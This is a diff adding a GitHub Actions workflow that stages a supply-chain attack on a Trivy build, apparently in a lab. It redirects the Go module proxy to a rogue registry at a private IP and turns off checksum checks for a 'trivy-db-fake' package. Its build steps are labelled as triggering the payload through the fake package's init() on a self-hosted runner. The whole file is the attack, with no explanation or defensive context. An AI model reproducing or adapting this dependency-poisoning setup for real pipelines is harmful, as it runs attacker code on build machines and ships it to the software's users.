@@ -1,0 +1,34 @@
+name: Build with Fake Dependency
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: self-hosted
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Set up Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+      
+      - name: Configure Go proxy to use fake registry
+        run: |
+          go env -w GOPROXY="http://192.168.56.101:8889,https://proxy.golang.org,direct"
+          go env -w GONOSUMDB="github.com/aquasecurity/trivy-db-fake"
+      
+      - name: Download dependencies (triggers payload)
+        run: |
+          go mod download
+          go mod tidy
+      
+      - name: Build (triggers init() of fake package)
+        run: |
+          go build -o dist/trivy ./cmd/trivy
+          echo "Build completed - dependency injected"
+      
+      - name: Verify fake package was imported
+        run: |
+          go list -m all | grep trivy-db-fake
